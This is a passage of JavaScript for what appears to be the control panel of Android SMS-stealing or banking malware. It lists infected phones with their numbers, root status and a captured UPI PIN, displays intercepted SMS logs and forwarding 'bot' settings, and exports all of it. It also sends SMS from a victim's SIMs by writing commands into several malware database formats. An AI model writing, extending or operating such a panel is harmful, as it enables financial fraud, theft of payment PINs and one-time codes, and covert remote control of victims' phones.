  exportDataBtn.addEventListener("click", () => {
    const payload = {
        clients: clientsData,
        messages: messagesData,
        bot_users: botUsersData,
        pins: pinsData,
      },
      blob = new Blob([JSON.stringify(payload, null, 4)], {
        type: "application/json",
      }),
      a = document.createElement("a");
    ((a.href = URL.createObjectURL(blob)),
      (a.download = `export_${Date.now()}.json`),
      a.click(),
      URL.revokeObjectURL(a.href),
      toast("Export downloaded successfully", "success"));
  }));
function renderActiveTabContent() {
  switch (currentActiveTab) {
    case "clients":
      isClientsLoaded
        ? generateClientsView(clientsData)
        : ($("clientsContainer").innerHTML =
            '<div class="col-span-full status-placeholder">Loading hardware profiles...</div>');
      break;
    case "messages":
      isMessagesLoaded
        ? generateSmsHubView(messagesData)
        : (smsMessagesContainer.innerHTML =
            '<div class="status-placeholder">Loading message logs...</div>');
      break;
    case "bots":
      generateBotsView(botUsersData);
      break;
    case "links":
      $("linksTableBody").innerHTML =
        '<tr><td colspan="3" class="p-4 text-center text-slate-600 text-xs">No proxy links records available for this database.</td></tr>';
      break;
    case "schemes":
      renderSchemesView();
      break;
  }
}
function relativeTime(input) {
  if (!input) return null;
  let ms = 0;
  if (typeof input == "number") ms = input;
  else {
    const s = String(input).trim();
    if (/^\d{10,13}$/.test(s)) ms = parseInt(s, 10);
    else {
      const d = new Date(s.replace(/\//g, "-"));
      if (!isNaN(d.getTime())) ms = d.getTime();
    }
  }
  if (!ms) return null;
  if (ms < 1e12) ms *= 1e3;
  const diff = Date.now() - ms;
  if (diff < 0) return "just now";
  const m = Math.floor(diff / 6e4);
  if (m < 1) return "just now";
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const d = Math.floor(h / 24);
  if (d < 30) return d + "d ago";
  const mo = Math.floor(d / 30);
  return mo < 12 ? mo + "mo ago" : Math.floor(mo / 12) + "y ago";
}
function getLastSeen(client) {
  if (!client) return null;
  const raw =
    client.lastSeen ||
    client.timestamp ||
    client.TimeandDate ||
    client.last_seen ||
    client.updatedAt;
  return relativeTime(raw);
}
function openGlobalSearch() {
  const m = $("globalSearchModal");
  if (!m) return;
  (m.classList.remove("hidden"),
    setTimeout(() => {
      const i = $("globalSearchInput");
      i && (i.focus(), i.select());
    }, 30));
}
function closeGlobalSearch() {
  const m = $("globalSearchModal");
  m && m.classList.add("hidden");
}
function runGlobalSearch() {
  const input = $("globalSearchInput"),
    box = $("globalSearchResults"),
    countEl = $("globalSearchCount");
  if (!input || !box) return;
  const q = (input.value || "").trim().toLowerCase();
  if (!q) {
    (box.innerHTML =
      '<div class="text-[10px] font-mono text-slate-600 text-center py-8">Type to search across every device and message in this database.</div>',
      countEl && (countEl.textContent = "0 results"));
    return;
  }
  const devHits = [],
    msgHits = [];
  Object.keys(clientsData || {}).forEach((id) => {
    if (!isValidDeviceId(id)) return;
    const c = clientsData[id] || {},
      phones = getPhoneNumbers(c) || [],
      blob = [
        id,
        c.modelName,
        c.person,
        c.service_provider,
        c.ip_address,
        ...phones,
        ...getCarriers(c),
      ]
        .filter(Boolean)
        .join(" ")
        .toLowerCase();
    blob.includes(q) && devHits.push({ id, c, phones });
  });
  Object.keys(messagesData || {}).forEach((devId) => {
    const logs = messagesData[devId];
    if (!logs) return;
    Object.keys(logs).forEach((mk) => {
      const m = logs[mk];
      if (!m) return;
      const blob = [m.sender, m.message, devId].filter(Boolean).join(" ").toLowerCase();
      blob.includes(q) && msgHits.push({ devId, m });
    });
  });
  const total = devHits.length + msgHits.length;
  countEl &&
    (countEl.textContent =
      total + " result" + (total === 1 ? "" : "s") +
      (msgHits.length > 200 ? " (showing 200 messages)" : ""));
  if (!total) {
    box.innerHTML =
      '<div class="text-[10px] font-mono text-slate-600 text-center py-8">No matches for “' +
      q.replace(/[<>&]/g, "") +
      '”.</div>';
    return;
  }
  let html = "";
  if (devHits.length) {
    html +=
      '<div class="text-[9px] font-mono font-bold text-cyan-400 uppercase tracking-wider px-1 pt-1">Devices (' +
      devHits.length +
      ")</div>";
    devHits.slice(0, 40).forEach(({ id, c, phones }) => {
      html += `
        <button data-gs-device="${id}" class="gs-device w-full text-left px-2.5 py-2 rounded-lg bg-slate-950/60 border border-slate-800 hover:border-cyan-500/40 transition flex items-center justify-between gap-2">
            <div class="min-w-0">
                <div class="text-[10px] font-mono font-bold text-slate-200 truncate">${id}</div>
                <div class="text-[9px] font-mono text-slate-500 truncate">${c.modelName || "—"}${phones.length ? " · " + phones.join(", ") : ""}</div>
            </div>
            <span class="text-[8px] font-bold px-1.5 py-0.5 rounded flex-shrink-0 ${c.status === !0 ? "bg-emerald-500/10 text-emerald-400" : "bg-slate-800 text-slate-500"}">${c.status === !0 ? "ON" : "OFF"}</span>
        </button>`;
    });
  }
  if (msgHits.length) {
    html +=
      '<div class="text-[9px] font-mono font-bold text-amber-400 uppercase tracking-wider px-1 pt-2">Messages (' +
      msgHits.length +
      ")</div>";
    msgHits.slice(0, 200).forEach(({ devId, m }) => {
      const body = String(m.message || "").slice(0, 160);
      html += `
        <button data-gs-device="${devId}" class="gs-device w-full text-left px-2.5 py-2 rounded-lg bg-slate-950/60 border border-slate-800 hover:border-amber-500/40 transition">
            <div class="flex items-center justify-between gap-2 mb-0.5">
                <span class="text-[9px] font-mono font-bold text-amber-400 truncate">${m.sender || "Unknown"}</span>
                <span class="text-[8px] font-mono text-slate-600 flex-shrink-0">${devId.slice(0, 8)}…</span>
            </div>
            <div class="text-[9px] font-mono text-slate-400 leading-snug">${body.replace(/[<>&]/g, "")}</div>
        </button>`;
    });
  }
  box.innerHTML = html;
  box.querySelectorAll(".gs-device").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = btn.getAttribute("data-gs-device");
      (closeGlobalSearch(), changeDeviceFilter(id), window.switchTab("messages"));
    });
  });
}
function generateClientsView(clientsNode) {
  const container = $("clientsContainer");
  if (!clientsNode || Object.keys(clientsNode).length === 0) {
    container.innerHTML =
      '<div class="col-span-full status-placeholder">No hardware profiles available.</div>';
    return;
  }
  let html = "";
  (Object.keys(clientsNode)
    .filter(isValidDeviceId)
    .sort()
    .forEach((hwId) => {
      if (selectedDeviceFilter !== "all" && selectedDeviceFilter !== hwId)
        return;
      const item = clientsNode[hwId];
      if (!item) return;
      const isOnline = item.status === !0;
      if (
        structuralStatusFilter !== "all" &&
        ((structuralStatusFilter === "online" && !isOnline) ||
          (structuralStatusFilter === "offline" && isOnline))
      )
        return;
      const battery = (item.battery || "0").toString().replace("%", ""),
        model = String(item.modelName || "Unknown Device"),
        storage = item.storage || "—",
        androidVer = item.androidV ? "API " + item.androidV : "Base",
        ipAddr = item.ip_address || "—",
        joined = item.joined || "—",
        isRooted = item.isRoot === !0,
        phoneNumbers = getPhoneNumbers(item),
        phoneDisplay = phoneNumbers
          ? phoneNumbers
              .map((n, i) => {
                const digits = String(n).replace(/\D/g, "").slice(-10),
                  matchingSim = Array.isArray(item.sims)
                    ? item.sims.find(
                        (sim) =>
                          sim &&
                          String(sim.phoneNumber || sim.number || sim.phone || "")
                            .replace(/\D/g, "")
                            .slice(-10) === digits,
                      )
                    : null,
                  slot = matchingSim && matchingSim.slot ? matchingSim.slot : i + 1;
                return `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">SIM${slot}: ${n}</span>`;
              })
              .join(" ")
          : '<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📱 —</span>',
        providerDisplay = getProviderLabel(item),
        carriers = getCarriers(item),
        simBadge = getSimBadge(item),
        upipin = item.upipin || null,
        simCount = getSimCount(item),
        lastSeen = getLastSeen(item),
        cpuArch = item.cpu_arch || "—";
      html += `
            <div data-id="${hwId}" class="client-interactive-card bg-slate-900/40 p-3 rounded-xl border ${isOnline ? "live-glow-active border-emerald-500/20" : "border-slate-900"} shadow flex flex-col space-y-2.5 cursor-pointer" data-search-blob="${hwId.toLowerCase()} ${model.toLowerCase()}">
                <!-- Header -->
                <div class="flex items-start justify-between gap-2">
                    <div class="overflow-hidden flex-1 min-w-0">
                        <div class="text-[9px] font-mono font-bold text-slate-500 tracking-wider flex items-center space-x-1.5 uppercase">
                            <span class="material-icons text-[10px] text-cyan-400">touch_app</span>
                            <span>Inspect Logs</span>
                            ${isRooted ? '<span class="bg-rose-500/10 text-rose-400 border border-rose-500/10 px-1 py-0.5 rounded text-[8px] font-bold">ROOTED</span>' : ""}
                            ${simBadge ? `<span class="${simBadge.dual ? "bg-purple-500/10 text-purple-400 border-purple-500/10" : "bg-slate-800 text-slate-400 border-slate-700"} border px-1 py-0.5 rounded text-[8px] font-bold">${simBadge.label}</span>` : ""}
                            ${item.isSdCard ? '<span class="bg-blue-500/10 text-blue-400 border border-blue-500/10 px-1 py-0.5 rounded text-[8px] font-bold">SD</span>' : ""}
                        </div>
                        <div class="text-xs font-bold text-slate-200 font-mono break-all mt-0.5">${hwId}</div>
                        <div class="text-[9px] text-slate-500 font-mono mt-0.5 truncate">${model}</div>
                    </div>
                    <span class="text-[9px] font-bold px-1.5 py-0.5 rounded flex-shrink-0 ${isOnline ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/10" : "bg-slate-800 text-slate-500 border border-slate-700"}">
                        ${isOnline ? "ONLINE" : "OFFLINE"}
                    </span>
                </div>
                ${lastSeen ? `<div class="text-[8px] font-mono text-slate-600 flex items-center gap-1"><span class="material-icons text-[10px]">schedule</span>seen ${lastSeen}</div>` : ""}
                
                <!-- Stats Grid -->
                <div class="grid grid-cols-3 gap-1.5 text-center font-mono text-[11px]">
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Battery</div>
                        <div class="text-slate-200 font-bold mt-0.5">${battery}%</div>
                    </div>
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Storage</div>
                        <div class="text-cyan-400 font-bold mt-0.5">${storage}</div>
                    </div>
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Android</div>
                        <div class="text-slate-400 font-bold mt-0.5">${androidVer}</div>
                    </div>
                    ${
                      item.sdkV
                        ? `
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">SDK</div>
                        <div class="text-slate-400 font-bold mt-0.5">${item.sdkV}</div>
                    </div>`
                        : ""
                    }
                    <div class="bg-slate-950/60 p-1.5 rounded-lg border border-slate-900">
                        <div class="text-[8px] text-slate-500 uppercase font-sans font-bold">Arch</div>
                        <div class="text-slate-400 font-bold mt-0.5 truncate">${cpuArch}</div>
                    </div>
                    ${
                      upipin
                        ? `
                    <div class="bg-amber-500/10 p-1.5 rounded-lg border border-amber-600/30 col-span-3">
                        <div class="text-[8px] text-amber-400 uppercase font-sans font-bold">🔑 UPI PIN</div>
                        <div class="text-amber-300 font-bold mt-0.5 text-xs tracking-widest select-all">${upipin}</div>
                    </div>`
                        : ""
                    }
                </div>
                
                <!-- Details Row -->
                <div class="flex flex-wrap gap-1 text-[9px] text-slate-500 font-mono border-t border-slate-800/40 pt-2">
                    ${phoneDisplay}
                    ${carriers.length ? `<span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📶 ${carriers.join(" · ")}</span>` : ""}
                    <span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📡 ${providerDisplay}</span>
                    <span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">🌐 ${ipAddr}</span>
                    <span class="bg-slate-950/50 px-1.5 py-0.5 rounded border border-slate-800/60">📅 ${joined}</span>
                </div>
            </div>`;
    }),
    (container.innerHTML =
      html ||
      '<div class="col-span-full status-placeholder">No matching devices found.</div>'),
    container.querySelectorAll(".client-interactive-card").forEach((card) => {
      card.addEventListener("click", function () {
        const deviceId = this.getAttribute("data-id");
        ((selectedDeviceFilter = deviceId),
          (currentSelectionLabel.innerText = `Scope: ${deviceId}`),
          (activeDeviceFilterLabel.innerText = deviceId),
          triggerSmsFetchBtn &&
            triggerSmsFetchBtn.classList.toggle("hidden", !1));
        const smsSendBtn = document.getElementById("triggerSmsSendBtn");
        (smsSendBtn && smsSendBtn.classList.toggle("hidden", !1),
          generateDeviceSidebarMenu(),
          window.switchTab("messages"));
      });
    }));
}
function generateSmsHubView(smsNode) {
  const container = smsMessagesContainer;
  if (!smsNode || Object.keys(smsNode).length === 0) {
    container.innerHTML =
      '<div class="status-placeholder">No message data available.</div>';
    return;
  }
  try {
    const messages = [];
    if (
      (Object.keys(smsNode).forEach((hwId) => {
        if (
          !isValidDeviceId(hwId) ||
          (selectedDeviceFilter !== "all" && selectedDeviceFilter !== hwId)
        )
          return;
        const userLogs = smsNode[hwId];
        userLogs &&
          Object.keys(userLogs).forEach((msgKey) => {
            const entry = userLogs[msgKey];
            if (!entry) return;
            let ts = 0;
            const keyNum = parseInt(msgKey);
            if (
              (keyNum > 1e12 && (ts = keyNum),
              !ts && entry.id && (ts = parseInt(entry.id)),
              ts || (ts = entry.ts || entry.timestamp || 0),
              !ts)
            ) {
              const dRaw =
                entry.date || entry.dateTime || entry.time || entry.recivedDate;
              if (dRaw) {
                const dn = parseInt(String(dRaw).replace(/\D/g, ""), 10);
                !isNaN(dn) && dn > 1e11 && (ts = dn < 1e11 ? dn * 1e3 : dn);
              }
            }
            messages.push({
              deviceId: hwId,
              sender: entry.sender || entry.from || entry.ph || "Unknown",
              message:
                entry.message || entry.msg || entry.text || entry.body || "",
              dateTime:
                entry.dateTime ||
                entry.time ||
                entry.date ||
                entry.recivedDate ||
                "",
              type: entry.type || "RAW",
              timestamp: ts,
              id: msgKey,
            });
          });
      }),
      messages.length === 0)
    ) {
      container.innerHTML =
        '<div class="status-placeholder">No messages match the current filter.</div>';
      return;
    }
    messages.sort((a, b) => b.timestamp - a.timestamp);
    const MAX = 300,
      display = messages.length > MAX ? messages.slice(0, MAX) : messages,
      hidden = messages.length - MAX;
    let html = "",
      lastDevice = "";
    (display.forEach((m) => {
      selectedDeviceFilter === "all" &&
        m.deviceId !== lastDevice &&
        (lastDevice !== "" &&
          (html += '<div class="border-t border-slate-800/30 my-2"></div>'),
        (html += `<div class="flex items-center space-x-1.5 px-1 py-1">
                    <span class="material-icons text-xs text-cyan-500">cell_tower</span>
                    <span class="text-[10px] font-bold font-mono text-cyan-400 uppercase tracking-wider">${m.deviceId}</span>
                </div>`),
        (lastDevice = m.deviceId));
      const isIncoming = m.type === "incoming" || m.type === "INCOMING";
      html += `
                <div class="bg-slate-900/40 p-3 rounded-xl border border-slate-900 shadow-sm space-y-1.5" data-search-blob="${(m.sender || "").toLowerCase()} ${(m.message || "").toLowerCase()} ${(m.deviceId || "").toLowerCase()}">
                    <div class="flex items-center justify-between gap-2">
                        <div class="flex items-center space-x-1.5 overflow-hidden min-w-0">
                            <span class="${isIncoming ? "bg-emerald-500/10 text-emerald-400" : "bg-amber-500/10 text-amber-400"} p-1 rounded-md border border-slate-800 flex items-center justify-center flex-shrink-0">
                                <span class="material-icons text-xs">${isIncoming ? "call_received" : "call_made"}</span>
                            </span>
                            <span class="text-xs font-bold text-slate-200 font-mono select-all truncate">${m.sender}</span>
                        </div>
                        <span class="text-[9px] font-mono text-slate-500 bg-slate-950 px-1.5 py-0.5 rounded border border-slate-800/60 flex-shrink-0">${m.dateTime}</span>
                    </div>
                    <p class="text-xs bg-slate-950 p-2 rounded-lg border border-slate-900 text-slate-300 font-mono break-all select-all leading-relaxed">${m.message}</p>
                    <div class="flex items-center justify-between text-[9px] font-mono">
                        <span class="text-slate-500">Device: <span class="text-cyan-500 font-bold select-all">${m.deviceId}</span></span>
                        <span class="uppercase font-black px-1.5 rounded ${isIncoming ? "bg-emerald-500/5 text-emerald-400" : "bg-amber-500/5 text-amber-400"}">${isIncoming ? "INCOMING" : "OUTGOING"}</span>
                    </div>
                </div>`;
    }),
      hidden > 0 &&
        (html += `<div class="text-center text-[10px] text-slate-600 font-mono py-2 border-t border-slate-800/30">
                Showing ${MAX} of ${messages.length} messages. ${hidden} older messages hidden.
            </div>`),
      (container.innerHTML = html));
  } catch (err) {
    (console.error("SMS render error:", err),
      (container.innerHTML = `<div class="status-placeholder">Error rendering messages: ${err.message}</div>`));
  }
}
function generateBotsView(botsNode) {
  const tbody = $("botsTableBody");
  if (!botsNode || Object.keys(botsNode).length === 0) {
    tbody.innerHTML =
      '<tr><td colspan="4" class="p-4 text-center text-slate-600 text-xs">No relay gateways configured in this database.</td></tr>';
    return;
  }
  const keys = Object.keys(botsNode);
  const isFlatConfig =
    keys.length > 0 &&
    keys.every((k) => {
      const v = botsNode[k];
      return v === null || typeof v != "object";
    });
  if (isFlatConfig) {
    const rows = keys
      .map(
        (k) => `
            <tr class="hover:bg-slate-900/40 transition">
                <td class="p-3 text-cyan-400 font-bold">${k}</td>
                <td class="p-3 text-slate-300">—</td>
                <td class="p-3 text-slate-400">flat config key</td>
                <td class="p-3 text-emerald-400">${botsNode[k] == null ? "—" : String(botsNode[k])}</td>
            </tr>`,
      )
      .join("");
    tbody.innerHTML = rows;
    return;
  }
  let html = "";
  (Object.keys(botsNode).forEach((botId) => {
    const bot = botsNode[botId];
    bot &&
      (html += `
            <tr class="hover:bg-slate-900/40 transition">
                <td class="p-3 text-cyan-400 font-bold">${botId}</td>
                <td class="p-3 text-slate-300">${bot.target_channel_id || "—"}</td>
                <td class="p-3 text-slate-400">${bot.target_channel_label || "—"}</td>
                <td class="p-3 text-emerald-400">${bot.forward_number || "—"}</td>
            </tr>`);
  }),
    (tbody.innerHTML = html));
}
function filterSidebarDeviceList() {
  const q = (deviceSearchInput.value || "").toLowerCase().trim();
  deviceTabsListContainer
    .querySelectorAll(".device-tab-item")
    .forEach((btn) => {
      const id = btn.getAttribute("data-device-id") || "";
      btn.style.display = id.includes(q) ? "" : "none";
    });
}
function executeClientSideSearch() {
  const q = (searchInputElement.value || "").toLowerCase().trim();
  let container, selector;
  if (currentActiveTab === "clients")
    ((container = $("clientsContainer")), (selector = "[data-search-blob]"));
  else if (currentActiveTab === "messages")
    ((container = smsMessagesContainer), (selector = "[data-search-blob]"));
  else return;
  container &&
    container.querySelectorAll(selector).forEach((el) => {
      const blob = el.getAttribute("data-search-blob") || "";
      el.style.display = blob.includes(q) ? "" : "none";
    });
}
function toast(msg, type = "info") {
  const el = document.createElement("div");
  ((el.className = `p-2.5 rounded-xl border shadow-2xl font-mono text-[10px] font-bold flex items-center space-x-2 transition-all duration-300 translate-y-2 bg-slate-950 pointer-events-auto ${type === "success" ? "border-emerald-500/20 text-emerald-400" : type === "error" ? "border-rose-500/20 text-rose-400" : "border-slate-800 text-cyan-400"}`),
    (el.innerHTML = `<span class="material-icons text-xs">notifications</span><span>${msg}</span>`),
    toastNotificationContainer.appendChild(el),
    requestAnimationFrame(() => el.classList.remove("translate-y-2")),
    setTimeout(() => {
      (el.classList.add("opacity-0", "translate-y-1"),
        setTimeout(() => el.remove(), 300));
    }, 3500));
}
function detectDBType() {
  if (schemaOverride !== null) return schemaOverride;
  if (detectedSchema >= 6) return detectedSchema;
  if (clientsData && Object.keys(clientsData).length > 0) {
    const firstKey = Object.keys(clientsData)[0],
      firstClient = clientsData[firstKey];
    if (
      firstClient &&
      (firstClient.Sim1 !== void 0 ||
        firstClient.device_name !== void 0 ||
        firstClient.charge !== void 0)
    )
      return 3;
  }
  if (messagesData && Object.keys(messagesData).length > 0) {
    const firstMsgKey = Object.keys(messagesData)[0],
      firstMsg = messagesData[firstMsgKey];
    if (firstMsg && typeof firstMsg == "object" && firstMsg.sendSms !== void 0)
      return 2;
  }
  return 1;
}
function createSendSmsPanel() {
  if (document.getElementById("sendSmsPanel")) return;
  const panel = document.createElement("div");
  ((panel.id = "sendSmsPanel"),
    (panel.className =
      "fixed bottom-20 right-4 z-50 bg-slate-900/95 backdrop-blur-xl border border-slate-800 rounded-2xl shadow-2xl p-4 w-80"),
    (panel.style.display = "none"),
    (panel.innerHTML = `
        <div class="flex items-center justify-between mb-3">
            <div>
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Send SMS</div>
                <div id="sendSmsTargetLabel" class="text-[9px] font-mono text-slate-500 truncate mt-0.5">Target: —</div>
            </div>
            <button id="closeSendSmsPanelBtn" class="text-slate-600 hover:text-slate-300 transition p-1">
                <span class="material-icons text-sm">close</span>
            </button>
        </div>
        <div class="space-y-2.5">
            <input id="sendSmsNumberInput" type="text" placeholder="+919876543210" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-200 placeholder-slate-600 outline-none focus:border-cyan-500/50 transition">
            <textarea id="sendSmsBodyInput" rows="3" placeholder="Type your message..." class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs font-mono text-slate-200 placeholder-slate-600 outline-none focus:border-cyan-500/50 transition resize-none"></textarea>
            <div class="flex items-center space-x-2">
                <button id="executeSmsSendBtn" class="flex-1 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-bold text-[10px] font-mono rounded-xl px-3 py-2.5 transition flex items-center justify-center space-x-1.5">
                    <span class="material-icons text-sm">rocket_launch</span>
                    <span>Send to ALL SIMs</span>
                </button>
            </div>
            <div id="sendSmsFeedback" class="text-[9px] font-mono text-slate-500 text-center hidden"></div>
        </div>
    `),
    document.body.appendChild(panel),
    document
      .getElementById("closeSendSmsPanelBtn")
      .addEventListener("click", () => {
        document.getElementById("sendSmsPanel").style.display = "none";
      }),
    document
      .getElementById("executeSmsSendBtn")
      .addEventListener("click", executeSmsSend));
}
async function executeSmsSend() {
  const toNumber = document.getElementById("sendSmsNumberInput").value.trim(),
    message = document.getElementById("sendSmsBodyInput").value.trim();
  if (!toNumber) {
    toast("Enter a phone number", "error");
    return;
  }
  if (!message) {
    toast("Enter a message body", "error");
    return;
  }
  if (!selectedDeviceFilter || selectedDeviceFilter === "all") {
    toast("Select a specific device first", "error");
    return;
  }
  const btn = document.getElementById("executeSmsSendBtn"),
    feedback = document.getElementById("sendSmsFeedback");
  ((btn.disabled = !0),
    (btn.innerHTML =
      '<span class="material-icons text-sm">sync</span><span>Sending...</span>'),
    (feedback.className = "text-[9px] font-mono text-slate-500 text-center"),
    (feedback.style.display = "block"),
    (feedback.textContent = "Dispatching command..."));
  const deviceId = selectedDeviceFilter,
    dbType = detectDBType();
  try {
    let successCount = 0,
      errorCount = 0;
    const client = clientsData[deviceId],
      sims = getPhoneNumbers(client),
      simCount = sims ? sims.length : 1;
    for (let i = 0; i < simCount; i++) {
      const simSlot = i + 1;
      try {
        if (dbType >= 6) {
          await dispatchDeviceCommand(deviceId, {
            action: "SEND_SMS",
            to: toNumber,
            message,
            sim: String(i),
          });
          successCount++;
        } else if (dbType === 3) {
          const simSlotIndex = String(i);
          (await Promise.all([
            writeData(ref(db, `system/panel/${deviceId}/panel`), {
              number: toNumber,
              slot: simSlotIndex,
              sms: message,
              timestamp: Date.now(),
            }),
            writeData(ref(db, `data/${deviceId}/sendSms`).push(), {
              to: toNumber,
              message,
              sim: simSlot,
              timestamp: Date.now(),
              status: "pending",
            }),
            writeData(ref(db, `common/sendCommand/${deviceId}`).push(), {
              type: "sendSMS",
              to: toNumber,
              message,
              sim: simSlot,
              timestamp: Date.now(),
            }),
          ]),
            successCount++);
        } else if (dbType === 2) {
          const cmdId = `cmd_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
          (await Promise.all([
            writeData(ref(db, `device_commands/${deviceId}/${cmdId}`), {
              sendSms: { body: message, sim: simSlot, to: toNumber },
              status: "pending",
              timestamp: Date.now(),
            }),
            writeData(ref(db, `commands/${deviceId}`).push(), {
              id: cmdId,
              message,
              sim: simSlot,
              timestamp: Date.now(),
              to: toNumber,
              type: "sendSMS",
            }),
            writeData(ref(db, `${deviceId}/pending_cmd`), {
              body: message,
              command: "sendSMS",
              command2: "send_sms",
              command3: "send message",
              message,
              messageText: message,
              number: toNumber,
              phoneNumber: toNumber,
              sim: simSlot,
              simSlot: String(simSlot - 1),
              targetDeviceId: deviceId,
              timestamp: Date.now(),
              to: toNumber,
            }),
            writeData(ref(db, `${deviceId}/cmd`).push(), {
              id: cmdId,
              message,
              sim: simSlot,
              timestamp: Date.now(),
              to: toNumber,
              type: "sendSMS",
            }),
          ]),
            successCount++);
        } else {
          await writeData(ref(db, `clients/${deviceId}/webhookEvent/sendSms`), {
            from: simSlot,
            to: toNumber,
            message,
            isSended: !1,
          });
          await dispatchDeviceCommand(deviceId, {
            action: "SEND_SMS",
            to: toNumber,
            message,
            sim: simSlot,
          });
          successCount++;
        }
      } catch (e) {
        errorCount++;
      }
    }
    const resultMsg =
      successCount > 0
        ? `Sent to ${successCount} SIM(s) successfully${errorCount > 0 ? ` (${errorCount} failed)` : ""}`
        : `Failed (${errorCount} errors)`;
    ((feedback.textContent = resultMsg),
      (feedback.style.color = successCount > 0 ? "#34d399" : "#fb7185"),
      toast(resultMsg, successCount === 0 ? "error" : "success"),
      successCount > 0 &&
        ((document.getElementById("sendSmsNumberInput").value = ""),
        (document.getElementById("sendSmsBodyInput").value = ""),
        setTimeout(() => {
          document.getElementById("sendSmsPanel").style.display = "none";
        }, 1500)));
  } catch (err) {
    ((feedback.textContent = `Error: ${err.message}`),
      (feedback.style.color = "#fb7185"),
      toast(`SMS dispatch failed: ${err.message}`, "error"));
  } finally {
    ((btn.disabled = !1),
      (btn.innerHTML =
        '<span class="material-icons text-sm">rocket_launch</span><span>Send to ALL SIMs</span>'));
  }
}
function openSendSmsPanel() {
  createSendSmsPanel();
  const panel = document.getElementById("sendSmsPanel");
  selectedDeviceFilter && selectedDeviceFilter !== "all"
    ? ((document.getElementById("sendSmsTargetLabel").textContent =
        `Target: ${selectedDeviceFilter}`),
      (panel.style.display = "block"))
    : toast("Select a specific device first", "error");
}
(function () {
  const smsSendBtn = document.getElementById("triggerSmsSendBtn");
  (smsSendBtn && smsSendBtn.addEventListener("click", openSendSmsPanel),
    createSendSmsPanel());
})();
function schemeBadge(sid) {
  const s = SCHEMES[sid];
  return `<span class="bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 px-1.5 py-0.5 rounded text-[8px] font-bold">${sid}</span>
            <span class="text-slate-400 text-[9px]">${s ? s.label : sid}</span>`;
}
function renderSchemesView() {
  const container = $("schemesContainer");
  if (!container) return;
  const dbCard = `
        <div class="bg-slate-900/40 border border-slate-800 rounded-xl p-3 space-y-2">
            <div class="flex items-center justify-between">
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Databases</div>
                <span class="text-[9px] font-mono text-slate-500">${savedDatabases.length} saved</span>
            </div>
            <div class="flex items-center gap-2">
                <select id="dbQuickSelectInline" class="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-2 py-1.5 text-[11px] font-mono text-slate-200 outline-none focus:border-cyan-500/50"></select>
                <button id="openDbManagerBtnInline" class="btn-secondary text-[10px] py-1.5 px-2.5 flex items-center gap-1">
                    <span class="material-icons text-xs">storage</span><span>Manage</span>
                </button>
            </div>
            <div class="text-[9px] font-mono text-slate-500 break-all">Active: <span class="text-emerald-400">${dbUrlBase(activeDatabaseUrl).replace(/^https?:\/\//, "")}</span></div>
            <div class="flex items-center justify-between gap-2 bg-slate-950/60 border border-slate-800 rounded-lg px-2 py-1.5">
                <span class="text-[9px] font-mono text-slate-500">Detected type</span>
                <span class="text-[9px] font-mono font-bold ${schemaIsManual() ? "text-amber-400" : "text-emerald-400"}">${schemaName(effectiveSchema())}${schemaIsManual() ? " · forced" : ""}</span>
            </div>
            <div class="text-[9px] font-mono text-slate-500 leading-relaxed">
                ${schemaEvidence.length ? schemaEvidence.map((e) => "• " + e).join("<br>") : "• detecting…"}
            </div>
            <p class="text-[9px] font-mono text-slate-600 leading-relaxed">
                Add any Firebase Realtime Database URL here — no need to edit <span class="text-slate-400">config.js</span>. The list is saved in this browser.
            </p>
        </div>`,
    schemaCard = `
        <div class="bg-slate-900/40 border border-slate-800 rounded-xl p-3 space-y-2">
            <div class="flex items-center justify-between">
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Detected Schema</div>
                <span class="text-[9px] font-mono ${schemaIsManual() ? "text-amber-400" : "text-slate-500"}">${schemaIsManual() ? "manual override" : "auto-detected"}</span>
            </div>
            <div class="flex items-center gap-2 flex-wrap">
                <span class="bg-slate-950 border border-slate-800 text-slate-300 px-2 py-1 rounded-lg text-[9px] font-mono">${schemaName(detectedSchema)}</span>
                <span class="material-icons text-[11px] text-slate-600">arrow_forward</span>
                <span class="${schemaIsManual() ? "bg-amber-500/10 border-amber-500/30 text-amber-400" : "bg-emerald-500/10 border-emerald-500/30 text-emerald-400"} border px-2 py-1 rounded-lg text-[9px] font-mono font-bold">${schemaName(effectiveSchema())}</span>
            </div>
            <div class="text-[9px] font-mono text-slate-500 leading-relaxed">
                ${schemaEvidence.length ? schemaEvidence.map((e) => "• " + e).join("<br>") : "• no evidence collected yet"}
            </div>
            <div class="flex items-center gap-2 pt-0.5">
                <label class="text-[9px] font-mono text-slate-500 flex-shrink-0">Force</label>
                <select id="schemaOverrideSelect" class="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-2 py-1.5 text-[10px] font-mono text-slate-200 outline-none focus:border-cyan-500/50">
                    <option value="auto">Auto-detect</option>
                    <option value="1">Type 1 · clients/messages</option>
                    <option value="2">Type 2 · command queue</option>
                    <option value="3">Type 3 · RTX</option>
                    <option value="4">Type 4 · custom</option>
                    <option value="5">Type 5 · custom</option>
